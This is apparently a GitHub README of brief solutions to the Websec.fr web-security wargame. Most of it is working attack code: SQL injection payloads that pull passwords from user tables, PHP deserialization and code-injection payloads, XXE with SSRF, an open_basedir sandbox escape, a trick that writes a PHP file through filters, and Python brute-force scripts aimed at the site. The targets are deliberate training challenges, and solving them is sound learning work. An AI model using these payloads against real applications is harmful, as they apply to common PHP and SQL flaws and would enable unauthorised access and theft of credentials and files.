# Websec.fr_Writeups
Summarized Websec.fr Writeups by me -_- Enjoy :)

## Level 1
```sql
1 union select 1,password from users limit 2,1;--
#or
1 union select 1, group_concat(username,password) from users;--
```

## Level 2
```sql
1 unioUNIONn selecSELECTt 1, password froFROMm users limit 0,1;--
```

## Level 3
```php
<?php
function findhash($prefix = '7c00') {
    for ($i = 0; $i < 100000000; $i++) 
        if (str_starts_with($h = sha1($i), $prefix)) 
        {
            echo "$i\n$h\n"; 
            break;
        }
}

findhash();
?>
```

```
returns:
104610
7c00f12c6e5cc9bd7239209971d5997c6953aba4
```

## Level 4
```php
<?php
class SQL {
    public $query = '';
    public function __construct() {
    $this->query = 'select password as username from users limit 0,1;';
    }
    
}
$test = new sql();
$serialized = serialize($test);
echo base64_encode($serialized);
?>
```

## Level 5
```bash
q=${include%19$_REQUEST[gg]}$flag}&gg=flag.php #any whitespace  and '@' character would work
```

## Level 7
```sql
777 union select max(login),pass from (select 1 as id,2 as login,3 as pass union select * from users)
```

## Level 8
part one:
```php
<?php $s=scandir("."); echo $s[3]; ?> #returns theres a flag.txt inside the directory
```

part two:
```php
<?php $s=show_source("flag.txt");echo $s; ?>
```

## Level 9
```python
import requests
import hashlib
import time



first_params = {
    'c': 'admin',
    'submit': 'Submit',
}
second_params = {
    'cache_file': ''
}

def convert_time(newtime):
    timestamp_str = str(newtime).encode()
    sha1_hash = hashlib.sha1(timestamp_str).hexdigest()
    return sha1_hash

def create_hashtime_list():
    times = []
    current_time = int(time.time())
    times.append(convert_time(current_time))
    for i in range(1,6):
        times.append(convert_time(current_time - i ))  
        times.append(convert_time(current_time + i ))
    return times

def main():
    #firstly we submit our eval payload
    payload = '\\x73\\x68\\x6f\\x77\\x5f\\x73\\x6f\\x75\\x72\\x63\\x65\\x28\\x22\\x66\\x6c\\x61\\x67\\x2e\\x74\\x78\\x74\\x22\\x29\\x3b' #show_source('flag.txt');
    first_params['c'] = payload
    first_r = requests.get('https://websec.fr/level09/index.php', params=first_params, verify=False)
    #secondly we create the time hashes of 10 seconds difference
    times = create_hashtime_list()
    #print(times)
    for hash_time in times:
        second_params['cache_file'] = '/tmp/' + hash_time
        check_hash_r = requests.get('https://websec.fr/level09/index.php', params=second_params, verify=False)
        if "websec{" in check_hash_r.text.lower():
            print(check_hash_r.text)
            break
    #print(response.text)
if __name__=='__main__':
    main()
```

## Level 10
```python
import requests

def main():
	prefix = "./"
	test_hash= "0e111111" #random 0e<random> since collision is if 0e is treated as 0
	for i in range(100000):
		r = requests.post(url="https://websec.fr/level10/index.php", data={"f":prefix+"flag.php","hash":test_hash})
		#print("requesting")
		if "websec{" in r.text.lower():
			print(prefix)
			print(r.text)
			break
		prefix+="/"
if __name__=="__main__":
	main()
```

## Level 11
```sql
user_id=777&table=(select+777+id,enemy+username+from+costume)&submit=Submit #because in sqlite doing enemy username = enemy as username
```

## Level 12
payload for reading index.php:
```xml
class set to simplexmlelement -> vuln to xxe

first parameter:
<!DOCTYPE easy [<!ENTITY ourdata SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
<easy>
&ourdata;
</easy>

second parameter(to allow xxe, many numbers which are translated to options, can be used, readmore: https://www.php.net/manual/en/libxml.constants.php#constant.libxml-dtdattr):
2
```

payload for reading flag with ssrf(since xxe supports php filters):
```xml
<!DOCTYPE easy [<!ENTITY ourdata SYSTEM "php://filter/convert.base64-encode/resource=http://127.0.0.1/level12/index.php">]>
<easy>
&ourdata;
</easy>

```

## Level 13
```bash
if( $s[$i] < 1 ) {
            unset($s[$i]);
}
calls unset on the comma values that got exploded
```
```sql
0,0,0, 1)) union select user_password, 1 ,1 from users;--
#or 
,,, 1)) union select user_password, 1 ,1 from users;--
```

## Level 14
Get all functions positions:
```python
import requests
import re
from urllib3.exceptions import InsecureRequestWarning
from urllib3 import disable_warnings
disable_warnings(InsecureRequestWarning)


headers = {
    'Host': 'websec.fr',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Safari/537.36',
}

data_default = 'code=echo+$blacklist{'

for i in range(0,1000):
    data=data_default +  str(i) + '};'
    response = requests.post('https://websec.fr/level14/index.php', headers=headers, data=data, verify=False)
    try:
        func = re.search('<pre>(\n.*?)</pre>',response.text).group(1)
        print(str(i) + ": " + func[1:])
    except Exception as e:
        print(e)
```

First Solution:
```bash
echo $blacklist{<num>} #works in the php version on the site but not in newer phps

#meaning we can access random functions and execute our desired code :)
echo $blacklist{<num>}() #will execute the function.


#show_source('flag.txt');
$blacklist{770}('<flag_file>'); #show_source('<flag_file>'); could've done but too long 
$variables{0}[0]($variables{0}[1]); #$_GET[0]($_GET[1])


$blacklist{562}(); -> phpinfo() #we get that finfo class is enabled and disable_functions - exec,passthru,shell_exec,system,proc_open,popen,parse_ini_file

echo new finfo(0,'/'); #because essentialy finfo spits out the entire contents of what we provided because / is not a proper file it will fail and wabbam we get the flag (this doesnt work in newer phps but works on the php version on this level.)
```

Second Solution:
```bash
crafting $_GET[0]($_GET[1]); to work on the level.
we can use ~'_GET' -> to create _GET to bypass '_' check with url encoding

<?php
$a = ~'_GET';
echo urlencode($a);
?>
returns %A0%B8%BA%AB

our final payload:
$a=${~%A0%B8%BA%AB};$a{0}($a{1}); #in short $a = '$_GET' which create $_GET[0]($_GET[1])

1. scandir:
POST /level14/index.php?0=assert&1=var_dump(scandir('.'))
code=$a=${~%A0%B8%BA%AB};$a{0}($a{1});

2. output the flag:
POST /level14/index.php?0=assert&1=show_source('<flag_hash>.php')
code=$a=${~%A0%B8%BA%AB};$a{0}($a{1});
```

## Level 15
```bash
Since create_function is broken theres command injection in it.
create_function looks something like this:
eval('function __lambda_func(){ $INPUT; }')

To escape and execute our desired code(the comment '//' is to ignore '}' at the end):
};echo $flag;//
or 
};show_source("flag.php");//
```

## Level 17
```bash
flag[]=random

Because something like this in a request: password[]=lol -> the $password becomes an array. And now comparing our input to the string, instead of throwing an error, it returns NULL and in PHP NULL == 0, which means string comparison passed and we got the flag :)
```

## Level 18
```php
<?php
$obj = new stdClass;//generic empty class.

$obj->input = &$obj->flag; //creating reference
echo serialize($obj);
?>
```

## Level 20
Bypassing regex on object creations(O:)
```php
<?php
class Flag implements Serializable{
	public function serialize() {
        return "<-_->"; //need to return something for Serializable interface
    }
    public function unserialize($str) { //must have for Serializable interface
        // ...
    }
    public function __destruct() {
       global $flag;
       echo $flag; 
    }
}

#simple way:
//$data = new Flag();
//echo serialize($data);

#elegant way:
$data_serialized = 'a:1:{i:0;s:4:"item";}'; //the normal way the application accepts serialized data
$data = unserialize($data_serialized);
array_push ($data, new Flag());
echo urlencode(base64_encode(serialize($data)));

?>
```

## Level 22
```bash
We use the same script I created(From Level 14) to gather functions positions that are defined in the $blacklist array(can call them because it evalutes -> $blacklist{<position>}(params); { instead of [ since it gets blocked).

Also we can see that flag is getting defined in the source code:
$a = new A($f1, $f2, $f3);

Meaning we can just var_dump our $flag, since '_' is getting blocked well use the position from the $blacklist we gathered

final payload:
$blacklist{582}($a);
```


## Level 24
```bash
Since we can use php filters on functions like file_get_contents and file_put_contents
We can make the filename decode its own base64 encoded content via file_put_contents into php code.

step 1:
create the code: <?php show_source("../../flag.php"); ?>
convert it to base64:
PD9waHAgc2hvd19zb3VyY2UoIi4uLy4uL2ZsYWcucGhwIik7ID8+Cg==

step 2:
put this as the filename -> php://filter/write=convert.base64-decode/resource=1.php
and content is -> PD9waHAgc2hvd19zb3VyY2UoIi4uLy4uL2ZsYWcucGhwIik7ID8+Cg==

step 3:
browse to 1.php
boom flag
```

## Level 25
```bash
Confusing url parsers:
https://websec.fr/level25/index.php?page=flag&send=Submit&:777 -> works on older phps
or 
https://websec.fr/////////////level25/index.php?page=flag&send=Submit
```

## Level 30
```C
ob_end_clean(); is the one that causes the program to crash without the output of __destruct

Meaning we have to turn the unserialize to true so it wont continue to ob_End_clean
Because everything in between ob_start and ob_end_clean doesnt gets outputted.
So we have to turn $a unserialize //to be True

And to do that we need to create any bool at the start and than our object:

which will create:
b:1;O:1:"B":0:{} // but the ; makes it ignore our object, lets do something else...

Saw that something weird is happening if you unserialize an array with two identical indexes it will not return false.

and bypass ob_end_clean

a:2:{i:0;O:1:"B":0:{}i:1;s:4:"test";} // will not work -> returns False
a:2:{i:0;O:1:"B":0:{}i:0;s:4:"test";} // will work -> returns True

many ways to solve this including giving wrong numbers, non existent property numbers.

also the most cool is having fun with the ob buffer.

up until some point of php we can use throwable class to cause an error, in newer versions of php its even easier to do. in the following level:

tada:
a:2:{i:0;O:1:"B":0:{}i:1;O:9:"Throwable":0:{}} 
```

## Level 31
```bash
The problem here is that were getting sandboxed in /sandbox, so need to bypass

#to print files in a directory(tried doing in ../):
$it = new DirectoryIterator( "glob://../*"); foreach($it as $f) { printf( "%s: %.1FK\n", $f->getFilename(), $f->getSize() / 1024); } 

With the above we get theres a -> ./sandbox/../flag.php

So I came up with the following solution:

chdir("tmp"); ini_set('open_basedir', 'sandbox:../');echo ini_get("open_basedir");chdir("..");chdir("..");echo show_source("flag.php");
#or
chdir('tmp'); ini_set('open_basedir','..'); chdir('..'); chdir('..'); ini_set('open_basedir','/');show_source("flag.php");  

Essentialy we change dir to tmp(can be any folder we create), we change the ini_set to still be able to take effect the sandbox but with added ../ it means we can access all of the above since open_basedir can be changed at runtime aslong as it tightens up restrictions and it still have to consider the old one, so when we write 'sanbox' in 'ini_set' it considers the old one, but with add ../ it lets us traverse back.

```

## Level 33
```bash
Same solution as described on Level 30, since the program crashes, we can make it crash endless ways, it will not reach the ob cleanup process which will inturn give us the flag.
```
